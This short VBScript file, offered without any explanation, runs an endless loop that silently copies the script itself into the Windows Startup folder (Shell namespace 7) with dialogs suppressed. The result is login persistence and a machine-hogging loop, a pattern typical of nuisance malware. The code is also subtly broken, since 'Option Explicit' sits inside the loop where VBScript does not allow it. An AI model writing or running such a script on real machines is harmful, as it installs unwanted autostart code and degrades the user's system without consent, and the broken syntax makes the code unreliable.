do
Option Explicit
        Dim objShell
        Set objShell = WScript.CreateObject("WScript.Shell")
CreateObject("Shell.Application").Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024
Set shell = CreateObject("WScript.Shell")
Set objShell = Nothing
loop